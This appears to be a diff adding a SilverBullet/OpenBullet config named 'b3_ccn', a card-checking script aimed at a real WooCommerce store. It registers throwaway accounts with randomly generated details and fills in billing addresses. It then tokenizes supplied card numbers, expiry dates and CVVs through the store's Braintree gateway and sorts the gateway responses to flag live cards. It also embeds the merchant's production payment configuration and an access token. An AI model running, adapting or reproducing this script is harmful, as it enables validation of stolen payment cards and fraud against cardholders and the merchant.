@@ -1,0 +1,320 @@
+[SETTINGS]
+{
+  "Name": "b3_ccn",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2023-06-21T18:36:05.6850219+07:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "",
+  "Version": "1.1.2 [SB]",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "IsBase64": false,
+  "FilterList": [],
+  "EvaluateMathOCR": false,
+  "SecurityProtocol": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "AcceptInsecureCertificates": true,
+  "DisableNotifications": false,
+  "DisableImageLoading": false,
+  "DefaultProfileDirectory": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": "",
+  "Title": "b3_ccn",
+  "IconPath": "Icon\\svbfile.ico",
+  "LicenseSource": null,
+  "Message": null,
+  "MessageColor": "#FFFFFFFF",
+  "HitInfoFormat": "[{hit.Type}][{hit.Proxy}] {hit.Data} - [{hit.CapturedString}]",
+  "AuthorColor": "#FFFFB266",
+  "WordlistColor": "#FFB5C2E1",
+  "BotsColor": "#FFA8FFFF",
+  "CustomInputColor": "#FFD6C7C7",
+  "CPMColor": "#FFFFFFFF",
+  "ProgressColor": "#FFAD93E3",
+  "HitsColor": "#FF66FF66",
+  "CustomColor": "#FFFFB266",
+  "ToCheckColor": "#FF7FFFD4",
+  "FailsColor": "#FFFF3333",
+  "RetriesColor": "#FFFFFF99",
+  "OcrRateColor": "#FF4698FD",
+  "ProxiesColor": "#FFFFFFFF"
+}
+
+[SCRIPT]
+FUNCTION GetRandomUA -> VAR "ua" 
+
+FUNCTION GenerateGUID -> VAR "ses" 
+
+FUNCTION RandomString "?i?i?i?i?i?i?i?i?i?i?i?i@gmail.com" -> VAR "email" 
+
+FUNCTION RandomString "?i?i?i?i?i?i?i?i?i?i?i?i@@" -> VAR "password" 
+
+FUNCTION RandomString "?i?i?i?i?i?i?i?i?i?i?i?i" -> VAR "username" 
+
+#device FUNCTION RandomString "?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i" -> VAR "device" 
+
+#cor FUNCTION RandomString "?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i" -> VAR "cor" 
+
+!#timeZone REQUEST GET "https://timeapi.io/api/Time/current/zone?timeZone=Europe/Amsterdam" 
+!  
+!  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+!  HEADER "Pragma: no-cache" 
+!  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "\"year\":" "," -> VAR "yearr" 
+
+PARSE "<SOURCE>" LR "\"month\":" "," -> VAR "month" 
+
+PARSE "<SOURCE>" LR "\"day\":" "," -> VAR "day" 
+
+PARSE "<SOURCE>" LR "\"hour\":" "," -> VAR "hour" 
+
+PARSE "<SOURCE>" LR "\"minute\":" "," -> VAR "minute" 
+
+PARSE "<SOURCE>" LR "\"seconds\":" "," -> VAR "seconds" 
+
+FUNCTION Constant "<yearr>-0<month>-<day> <hour>-<minute>-<seconds>" -> VAR "timezoneee" 
+
+#YEAR_ FUNCTION Translate 
+  KEY "21" VALUE "2021" 
+  KEY "22" VALUE "2022" 
+  KEY "23" VALUE "2023" 
+  KEY "24" VALUE "2024" 
+  KEY "25" VALUE "2025" 
+  KEY "26" VALUE "2026" 
+  KEY "27" VALUE "2027" 
+  KEY "28" VALUE "2028" 
+  KEY "29" VALUE "2029" 
+  KEY "30" VALUE "2030" 
+  KEY "31" VALUE "2031" 
+  KEY "2021" VALUE "2021" 
+  KEY "2022" VALUE "2022" 
+  KEY "2023" VALUE "2023" 
+  KEY "2024" VALUE "2024" 
+  KEY "2025" VALUE "2025" 
+  KEY "2026" VALUE "2026" 
+  KEY "2027" VALUE "2027" 
+  KEY "2028" VALUE "2028" 
+  KEY "2029" VALUE "2029" 
+  KEY "2030" VALUE "2030" 
+  KEY "2031" VALUE "2031" 
+  "<ano>" -> VAR "ano1" 
+
+#MONTH FUNCTION Translate 
+  KEY "1" VALUE "01" 
+  KEY "2" VALUE "02" 
+  KEY "3" VALUE "03" 
+  KEY "4" VALUE "04" 
+  KEY "5" VALUE "05" 
+  KEY "6" VALUE "06" 
+  KEY "7" VALUE "07" 
+  KEY "8" VALUE "08" 
+  KEY "9" VALUE "09" 
+  KEY "10" VALUE "10" 
+  KEY "11" VALUE "11" 
+  KEY "12" VALUE "12" 
+  KEY "01" VALUE "01" 
+  KEY "02" VALUE "02" 
+  KEY "03" VALUE "03" 
+  KEY "04" VALUE "04" 
+  KEY "05" VALUE "05" 
+  KEY "06" VALUE "06" 
+  KEY "07" VALUE "07" 
+  KEY "08" VALUE "08" 
+  KEY "09" VALUE "09" 
+  "<mes>" -> VAR "mes1" 
+
+FUNCTION Substring "0" "1" "<cc>" -> VAR "string" 
+
+#TYPE FUNCTION Translate 
+  KEY "3" VALUE "american-express" 
+  KEY "4" VALUE "visa" 
+  KEY "5" VALUE "master-card" 
+  KEY "6" VALUE "discover" 
+  "<string>" -> VAR "type" 
+
+#GET_NAME_+_LAST REQUEST GET "https://randomuser.me/api/1.2/?nat=us" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" JSON "last" -> VAR "last" 
+
+PARSE "<SOURCE>" JSON "first" -> VAR "name" 
+
+#street PARSE "<SOURCE>" JSON "street" -> VAR "street" 
+
+#city PARSE "<SOURCE>" JSON "city" -> VAR "city" 
+
+#state PARSE "<SOURCE>" JSON "state" -> VAR "state" 
+
+#zip PARSE "<SOURCE>" LR "\"postcode\":" "," -> VAR "zip" 
+
+#phone PARSE "<SOURCE>" JSON "phone" -> VAR "phone" 
+
+#CHUYEN_DOI_STATE FUNCTION Translate 
+  KEY "alabama" VALUE "AL" 
+  KEY "alaska" VALUE "AK" 
+  KEY "arizona" VALUE "AR" 
+  KEY "california" VALUE "CA" 
+  KEY "colorado" VALUE "CO" 
+  KEY "connecticut" VALUE "CT" 
+  KEY "delaware" VALUE "DE" 
+  KEY "district of columbia" VALUE "DC" 
+  KEY "florida" VALUE "FL" 
+  KEY "georgia" VALUE "GA" 
+  KEY "hawaii" VALUE "HI" 
+  KEY "idaho" VALUE "ID" 
+  KEY "illinois" VALUE "IL" 
+  KEY "indiana" VALUE "IN" 
+  KEY "iowa" VALUE "IA" 
+  KEY "kansas" VALUE "KS" 
+  KEY "kentucky" VALUE "KY" 
+  KEY "louisiana" VALUE "LA" 
+  KEY "maine" VALUE "ME" 
+  KEY "maryland" VALUE "MD" 
+  KEY "massachusetts" VALUE "MA" 
+  KEY "michigan" VALUE "MI" 
+  KEY "minnesota" VALUE "MN" 
+  KEY "mississippi" VALUE "MS" 
+  KEY "missouri" VALUE "MO" 
+  KEY "montana" VALUE "MT" 
+  KEY "nebraska" VALUE "NE" 
+  KEY "nevada" VALUE "NV" 
+  KEY "new hampshire" VALUE "NH" 
+  KEY "new jersey" VALUE "NJ" 
+  KEY "new mexico" VALUE "NM" 
+  KEY "new york" VALUE "LA" 
+  KEY "north carolina" VALUE "NC" 
+  KEY "north dakota" VALUE "ND" 
+  KEY "Ohio" VALUE "OH" 
+  KEY "oklahoma" VALUE "OK" 
+  KEY "oregon" VALUE "OR" 
+  KEY "pennsylvania" VALUE "PA" 
+  KEY "rhode Island" VALUE "RI" 
+  KEY "south carolina" VALUE "SC" 
+  KEY "south dakota" VALUE "SD" 
+  KEY "tennessee" VALUE "TN" 
+  KEY "texas" VALUE "TX" 
+  KEY "utah" VALUE "UT" 
+  KEY "vermont" VALUE "VT" 
+  KEY "virginia" VALUE "VA" 
+  KEY "washington" VALUE "WA" 
+  KEY "west virginia" VALUE "WV" 
+  KEY "wisconsin" VALUE "WI" 
+  KEY "wyoming" VALUE "WY" 
+  "<state>" -> VAR "state1" 
+
+#Register_GET REQUEST GET "https://powerdrivendiesel.com/?v=5b61a1b298a0" 
+  
+  HEADER "User-Agent: <ua>" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "name=\"woocommerce-register-nonce\" value=\"" "\"" -> VAR "registerrrr" 
+
+#Register_POST REQUEST POST "https://powerdrivendiesel.com/?v=5b61a1b298a0" 
+  CONTENT "email=<email>&password=<password>metorik_source_type=typein&metorik_source_url=%28none%29&metorik_source_mtke=%28none%29&metorik_source_utm_campaign=%28none%29&metorik_source_utm_source=%28direct%29&metorik_source_utm_medium=%28none%29&metorik_source_utm_content=%28none%29&metorik_source_utm_id=%28none%29&metorik_source_utm_term=%28none%29&metorik_source_session_entry=https%3A%2F%2Fpowerdrivendiesel.com%2F%3Fv%3D5b61a1b298a0&metorik_source_session_start_time=2023-06-21 13-26-25&metorik_source_session_pages=1&metorik_source_session_count=1&woocommerce-register-nonce=<registerrrr>&_wp_http_referer=%2F%3Fv%3D5b61a1b298a0&register=Register" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: <ua>" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Billing_GET REQUEST GET "https://powerdrivendiesel.com/my-account/edit-address/billing/" 
+  
+  HEADER "User-Agent: <ua>" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "name=\"woocommerce-edit-address-nonce\" value=\"" "\"" -> VAR "adddddd" 
+
+#Billing_POST REQUEST POST "https://powerdrivendiesel.com/my-account/edit-address/billing/" 
+  CONTENT "billing_first_name=<name>&billing_last_name=<last>&billing_company=&billing_address_1=new york123&billing_email=<email>&billing_address_2=&billing_phone=<phone>&billing_city=new+york&billing_state=NY&billing_postcode=10080&billing_country=US&save_address=Save+address&woocommerce-edit-address-nonce=<adddddd>&_wp_http_referer=%2Fmy-account%2Fedit-address%2Fbilling%2F&action=edit_address" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: <ua>" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+REQUEST GET "https://powerdrivendiesel.com/my-account/add-payment-method/" 
+  
+  HEADER "User-Agent: <ua>" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "var wc_braintree_client_token = [\"" "\"" -> VAR "clientt" 
+
+FUNCTION Base64Decode "<clientt>" -> VAR "clientt1" 
+
+PARSE "<clientt1>" JSON "authorizationFingerprint" -> VAR "auth" 
+
+PARSE "<SOURCE>" LR "ame=\"woocommerce-add-payment-method-nonce\" value=\"" "\"" -> VAR "pmmmmmmm" 
+
+REQUEST POST "https://payments.braintree-api.com/graphql" 
+  CONTENT "{\"clientSdkMetadata\":{\"source\":\"client\",\"integration\":\"custom\",\"sessionId\":\"<ses>\"},\"query\":\"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }\",\"variables\":{\"input\":{\"creditCard\":{\"number\":\"<cc>\",\"expirationMonth\":\"<mes1>\",\"expirationYear\":\"<ano1>\",\"cvv\":\"<cvv>\",\"billingAddress\":{\"postalCode\":\"10080\",\"streetAddress\":\"new york 123\"}},\"options\":{\"validate\":false}}},\"operationName\":\"TokenizeCreditCard\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "authority: payments.braintree-api.com" 
+  HEADER "accept: */*" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9,vi;q=0.8" 
+  HEADER "authorization: Bearer <auth>" 
+  HEADER "braintree-version: 2018-05-10" 
+  HEADER "content-length: 812" 
+  HEADER "content-type: application/json" 
+  HEADER "origin: https://assets.braintreegateway.com" 
+  HEADER "referer: https://assets.braintreegateway.com/" 
+  HEADER "sec-ch-ua: \"Chromium\";v=\"110\", \"Not A(Brand\";v=\"24\", \"Google Chrome\";v=\"110\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: cross-site" 
+  HEADER "User-Agent: <ua>" 
+
+PARSE "<SOURCE>" JSON "token" -> VAR "token" 
+
+REQUEST POST "https://powerdrivendiesel.com/my-account/add-payment-method/" 
+  CONTENT "payment_method=braintree_cc&braintree_cc_nonce_key=<token>&braintree_cc_device_data=%7B%22device_session_id%22%3A%22<device>%22%2C%22fraud_merchant_id%22%3Anull%2C%22correlation_id%22%3A%22<cor>%22%7D&braintree_cc_3ds_nonce_key=&braintree_cc_config_data=%7B%22environment%22%3A%22production%22%2C%22clientApiUrl%22%3A%22https%3A%2F%2Fapi.braintreegateway.com%3A443%2Fmerchants%2Fd8w56dfhw2qnb5tw%2Fclient_api%22%2C%22assetsUrl%22%3A%22https%3A%2F%2Fassets.braintreegateway.com%22%2C%22analytics%22%3A%7B%22url%22%3A%22https%3A%2F%2Fclient-analytics.braintreegateway.com%2Fd8w56dfhw2qnb5tw%22%7D%2C%22merchantId%22%3A%22d8w56dfhw2qnb5tw%22%2C%22venmo%22%3A%22off%22%2C%22graphQL%22%3A%7B%22url%22%3A%22https%3A%2F%2Fpayments.braintree-api.com%2Fgraphql%22%2C%22features%22%3A%5B%22tokenize_credit_cards%22%5D%7D%2C%22kount%22%3A%7B%22kountMerchantId%22%3Anull%7D%2C%22challenges%22%3A%5B%22cvv%22%2C%22postal_code%22%5D%2C%22creditCards%22%3A%7B%22supportedCardTypes%22%3A%5B%22American+Express%22%2C%22MasterCard%22%2C%22Visa%22%2C%22Discover%22%2C%22JCB%22%2C%22UnionPay%22%5D%7D%2C%22threeDSecureEnabled%22%3Atrue%2C%22threeDSecure%22%3A%7B%22cardinalAuthenticationJWT%22%3A%22eyJhbGciOiJIUzI1NiJ9.eyJqdGkiOiI2NTI4OTQ0NS01OTI0LTRjODktYjU1OS03YjE2ZTkzMGU5NDIiLCJpYXQiOjE2ODcxNzA1MjgsImV4cCI6MTY4NzE3NzcyOCwiaXNzIjoiNjQwOWNhYzg5MzA0Y2UwOTQwNGI3NzAyIiwiT3JnVW5pdElkIjoiNjQwOTE0MDE5MzA0Y2UwOTQwNGI3NmI2In0.TpzaNf_nz1sOWrIvv6WDg7kp8cJFsVt9vx-7x1N9oHs%22%7D%2C%22payWithVenmo%22%3A%7B%22merchantId%22%3A%223759270502633724131%22%2C%22accessToken%22%3A%22access_token%24production%24d8w56dfhw2qnb5tw%24a8904cb5b7efd59152aa2a70994ce2d2%22%2C%22environment%22%3A%22production%22%7D%2C%22paypalEnabled%22%3Afalse%7D&woocommerce-add-payment-method-nonce=<pmmmmmmm>&_wp_http_referer=%2Fmy-account%2Fadd-payment-method%2F&woocommerce_add_payment_method=1" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: <ua>" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "Reason:" "</li>" CreateEmpty=FALSE -> CAP "Result" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Success OR 
+    KEY "Reason: Insufficient Funds" 
+    KEY "Reason: Gateway Rejected: avs" 
+    KEY "Payment method successfully added." 
+    KEY "New payment method added" 
+    KEY "81724: Duplicate card exists in the vault." 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "Reason: Card Issuer Declined CVV" 
+    KEY "Reason: Gateway Rejected: cvv" 
+    KEY "Reason: Gateway Rejected: avs_and_cvv" 
+    KEY "Reason: CVV" 
+  KEYCHAIN Retry OR 
+    KEY "risk_threshold" 
+
